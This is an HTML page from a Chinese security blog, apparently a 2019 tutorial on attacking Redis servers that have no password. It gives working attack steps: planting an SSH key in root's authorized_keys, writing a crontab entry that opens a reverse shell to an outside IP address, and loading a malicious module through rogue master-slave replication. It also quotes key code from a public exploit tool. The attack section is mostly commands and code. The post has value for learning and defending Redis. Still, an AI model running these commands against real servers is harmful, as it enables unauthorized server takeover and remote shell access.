@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+<head>
+    
+    <title>redis未授权访问 - Hexo</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/images/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="Redis未授权访问Redis的默认密码为空所导致，主要危害来源在于其可以以Redis启动权限写文件：  root身份运行时，可以给root账户写SSH公钥，直接登录服务器 写入crontab创建计划任务 主从复制执行命令  写入公钥需要root权限  本地生成公钥：  ssh-keygen -t rsa  将公钥写入1.txt,并传入redis缓存  (echo -e &quot;\\n\\n&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="redis未授权访问">
+<meta property="og:url" content="https://0xr1ngs.github.io/2019/12/12/redis/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Redis未授权访问Redis的默认密码为空所导致，主要危害来源在于其可以以Redis启动权限写文件：  root身份运行时，可以给root账户写SSH公钥，直接登录服务器 写入crontab创建计划任务 主从复制执行命令  写入公钥需要root权限  本地生成公钥：  ssh-keygen -t rsa  将公钥写入1.txt,并传入redis缓存  (echo -e &quot;\\n\\n&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2019-12-12T12:52:05.000Z">
+<meta property="article:modified_time" content="2023-09-20T15:49:22.335Z">
+<meta property="article:author" content="r1ngs">
+<meta property="article:tag" content="未授权访问">
+<meta name="twitter:card" content="summary">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1695315378814">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1695315378814">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1695315378814">
+        
+    
+
+    
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+
+
+    <script async src="/js/app.js?v=1695315378814"></script>
+    
+     
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="stylesheet" href="/css/prism-one-dark.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" 
+            style="background-image: url(/images/7.jpg)"
+        ></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="r1ngs" class="mdui-btn mdui-btn-icon"><img src="/images/avator.jpg" alt="r1ngs"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="r1ngs">
+            <img src="/images/avator.jpg" alt="r1ngs" alt="r1ngs">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>15</div>
+        <div><span>Tags</span>9</div>
+        <div><span>Categories</span>3</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+        
+            
+            <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+        
+            
+            <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://github.com/0xr1ngs/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		>
+	</div>
+</div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Categories</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/CTF/">CTF</a>
+          <span class="category-list-count">1</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Crypto/">Crypto</a>
+          <span class="category-list-count">5</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/Web/">Web</a>
+          <span class="category-list-count">9</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Java/" style="font-size: 20px;">Java</a> <a href="/tags/cbc/" style="font-size: 10px;">cbc</a> <a href="/tags/csrf/" style="font-size: 10px;">csrf</a> <a href="/tags/sqli/" style="font-size: 20px;">sqli</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/xxe/" style="font-size: 10px;">xxe</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" style="font-size: 20px;">未授权访问</a>
+    </div>
+    
+      <script>
+        var maxTagcloud = parseInt(17);
+        var tags_length = parseInt(9);
+        var tags_arr = [];
+        for(var i = 0; i < tags_length; i++){
+          tags_arr.push(i);
+        }
+        tags_arr.sort(function (l, r) {
+          return Math.random() > 0.5 ? -1 : 1;
+        });
+        tags_arr = tags_arr.slice(0, maxTagcloud < tags_length ? tags_length - maxTagcloud : 0);
+        for(var tag_i = 0; tag_i < tags_arr.length; tag_i++){
+          document.getElementById("randomtagcloud").children[tags_arr[tag_i]].style.display = 'none';
+        }
+      </script>
+    
+  </div>
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/">2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/">2019</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">6</span></li></ul>
+    </div>
+  </div>
+
+
+
+        
+            
+            
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/06/19/Java-Jndi/">Jndi注入</a>
+          </li>
+        
+          <li>
+            <a href="/2022/07/16/LGP-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">一次内网渗透测试</a>
+          </li>
+        
+          <li>
+            <a href="/2019/12/12/redis/">redis未授权访问</a>
+          </li>
+        
+          <li>
+            <a href="/2019/12/12/php-fpm/">php-fpm</a>
+          </li>
+        
+          <li>
+            <a href="/2019/11/15/%E8%A7%A3n%E6%AC%A1%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B/">解n次同余方程</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+        
+    </aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 r1ngs
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+    <div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 31.575123152709356%;"> 
+            <img src="/2019/12/12/redis/1.png" alt="redis未授权访问" loading="lazy">
+            <h1>redis未授权访问</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2019年12月12日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/Web/">Web</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><p>Redis的默认密码为空所导致，主要危害来源在于其可以以Redis启动权限写文件：</p>
+<ul>
+<li>root身份运行时，可以给root账户写SSH公钥，直接登录服务器</li>
+<li>写入crontab创建计划任务</li>
+<li>主从复制执行命令</li>
+</ul>
+<h2 id="写入公钥"><a href="#写入公钥" class="headerlink" title="写入公钥"></a>写入公钥</h2><p>需要root权限</p>
+<ul>
+<li>本地生成公钥：</li>
+</ul>
+<p><code>ssh-keygen -t rsa</code></p>
+<ul>
+<li>将公钥写入1.txt,并传入redis缓存</li>
+</ul>
+<p><code>(echo -e &quot;\\n\\n&quot;; cat id_rsa.pub; echo -e &quot;\\n\\n&quot;) &gt; 1.txt</code> （前后增加换行，否则 <code>redis</code>持久化会写入额外的不可见字符导致公钥识别失败）</p>
+<p><code>cat 1.txt | redis-cli -h 192.168.125.128 -x set 1</code></p>
+<ul>
+<li>设置路径、文件、写入公钥</li>
+</ul>
+<p><code>config set dir /root/.ssh</code></p>
+<p><code>config set dbfilename authorized_keys</code></p>
+<p><code>save</code></p>
+<ul>
+<li>使用生成的公钥连接</li>
+</ul>
+<p><code>ssh -i id_rsa r1ngs@192.168.125.128</code></p>
+<p>实际上：尽管使用 <strong><code>root</code></strong> 用户启动了 Redis，Redis 本身会在启动后将自身的权限降低为 <strong><code>redis</code></strong> 用户（ps aux |grep redis）。config set dir时便会爆出：<code>(error) ERR Changing directory: Permission denied</code></p>
+<p>如果要让redis以root方式启动，可以手动编译安装低版本源码。</p>
+<p>同理，可以写入Webshell。</p>
+<h2 id="写入Contab"><a href="#写入Contab" class="headerlink" title="写入Contab"></a>写入Contab</h2><p><code>config set dir /var/spool/cron/crontabs</code></p>
+<p><code>config set dbfilename root</code></p>
+<p><code>set 1 &quot;\\n\\n* * * * * bash -i &gt;&amp; /dev/tcp/47.113.150.151/12345 0&gt;&amp;1\\n\\n&quot;</code></p>
+<p><code>save</code></p>
+<p>实际还是需要root权限。</p>
+<h2 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a><strong><strong>主从复制</strong></strong></h2><p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)。数据会单向自动同步，一般从机只负责读，主机只负责写。</p>
+<p>在Reids 4.x之后(&lt;&#x3D;5.0.5)，Redis新增了模块功能，通过加载动态链接库执行命令。主从复制就是用来将动态链接库传输到redis服务器。从机设置slaveof以后，主机可以通过发送FULLRESYNC（全量同步，会同步rdb文件）同步文件到从机上。</p>
+<p>在主机上设置：</p>
+<pre class="line-numbers language-json"><code class="language-json"><span class="token number">127.0</span>.<span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6379</span>> config set dir /home/r1ngs/redis-rogue-getshell-master/RedisModulesSDK
+OK
+<span class="token number">127.0</span>.<span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6379</span>> config set dbfilename exp.so
+OK
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后在从机上</p>
+<pre class="line-numbers language-json"><code class="language-json"><span class="token number">127.0</span>.<span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6379</span>> config set dir /home/r1ngs
+OK
+<span class="token number">127.0</span>.<span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6379</span>> config set dbfilename exp.so
+OK
+<span class="token number">127.0</span>.<span class="token number">0.1</span><span class="token operator">:</span><span class="token number">6379</span>> slaveof <span class="token number">192.168</span>.<span class="token number">125.128</span> <span class="token number">6379</span>
+OK
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行完成以后会立即生成&#x2F;home&#x2F;r1ngs&#x2F;exp.so，但是生成的exp.so是主机的持久化文件（文件大小不一样）。因此，需要模拟请求。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a></p>
+<p>关键代码：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">elif</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'PSYNC'</span><span class="token punctuation">)</span> <span class="token operator">or</span> arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>b<span class="token string">'SYNC'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'+FULLRESYNC '</span> <span class="token operator">+</span> b<span class="token string">'Z'</span> <span class="token operator">*</span> <span class="token number">40</span> <span class="token operator">+</span> b<span class="token string">' 1'</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>b<span class="token string">'$'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
+    self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>self<span class="token punctuation">.</span>server<span class="token punctuation">.</span>payload <span class="token operator">+</span> DELIMITER<span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" rel="tag">未授权访问</a>
+    
+</div>
+  
+  
+    <script async src="/js/copy-codeblock.js?v=1695315378772"></script>
+  
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+</div>
+        <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.</span> <span class="toc-text">Redis未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E5%85%AC%E9%92%A5"><span class="toc-number">1.1.</span> <span class="toc-text">写入公钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%85%A5Contab"><span class="toc-number">1.2.</span> <span class="toc-text">写入Contab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6"><span class="toc-number">1.3.</span> <span class="toc-text">主从复制</span></a></li></ol></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="Search"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+
+</body>
+
+</html>
